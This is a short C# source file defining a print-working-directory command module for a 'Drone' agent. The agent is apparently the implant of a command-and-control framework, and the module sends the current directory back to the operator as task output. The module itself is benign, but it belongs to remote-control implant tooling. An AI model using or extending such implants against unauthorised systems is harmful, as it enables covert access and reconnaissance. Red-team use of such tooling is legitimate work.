using System.IO;
using System.Threading;

namespace Drone.Commands;

public sealed class PrintWorkingDirectory : DroneCommand
{
    public override byte Command => 0x14;
    public override bool Threaded => false;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var directory = Directory.GetCurrentDirectory();
        Drone.SendTaskOutput(task.Id, directory);
    }
}